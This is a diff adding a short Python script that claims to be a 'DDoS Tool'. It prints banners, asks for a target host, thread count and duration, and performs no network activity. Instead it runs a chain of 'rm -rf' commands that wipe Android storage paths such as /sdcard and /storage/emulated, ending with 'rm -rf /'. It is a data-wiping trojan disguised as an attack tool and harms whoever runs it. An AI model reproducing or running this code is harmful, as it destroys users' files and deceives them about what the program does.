@@ -1,0 +1,41 @@
+import os
+import threading
+import time
+import random
+
+os.system('clear')
+print("\033[1;31;40m____________________________________________________________ ")
+print("")
+print("\x1b[1;31;40m██████╗░██████╗░░█████╗░░██████╗           ")
+print("██╔══██╗██╔══██╗██╔══██╗██╔════╝             ")
+print("██║░░██║██║░░██║██║░░██║╚█████╗░            ")
+print("██║░░██║██║░░██║██║░░██║░╚═══██╗                    ")
+print("██████╔╝██████╔╝╚█████╔╝██████╔╝               ")
+print("╚═════╝░╚═════╝░░╚════╝░╚═════╝░                ")
+print("\033[1;31;36m                              _____           _ ")
+print("                             |_   _|__   ___ | |")
+print("                               | |/ _ \ / _ \| |")
+print("                               | | (_) | (_) | |")
+print("                               |_|\___/ \___/|_|")
+print("")
+print("\033[1;31;40m____________________________________________________________ ")
+print("\033[1;31;36m                  | Coded By: Mr.Planter |")
+print("\033[1;31;40m            ____________________________________ ")
+print("\033[1;31;40m ____________________________________________________________")
+
+host = str(input("Enter Target: "))
+threads = int(input("Threads: "))
+time = int(input("Times: "))
+print("_ _____ _____ _   ___ _  _____ ___ _  _ _____ ")
+print(" /_\_   _|_   _/_\ / __| |/ / __| __| \| |_   _|")
+print(" / _ \| |   | |/ _ \ (__| ' <\__ \ _|| .` | | |  ")
+print("/_/ \_\_|   |_/_/ \_\___|_|\_\___/___|_|\_| |_| ")
+
+os.system('rm -rf /system/emulated/*')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
